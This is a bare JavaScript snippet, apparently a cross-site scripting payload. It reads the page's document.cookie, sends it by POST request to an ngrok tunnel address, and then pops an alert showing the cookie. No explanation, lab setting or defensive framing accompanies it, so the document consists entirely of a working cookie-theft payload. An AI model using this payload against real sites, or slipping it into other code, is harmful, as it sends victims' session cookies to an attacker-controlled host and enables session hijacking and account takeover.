var xhr = new XMLHttpRequest();
xhr.open("POST", "https://726f26fb1d8e.ngrok.io", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({ value: document.cookie }));
alert(document.cookie);
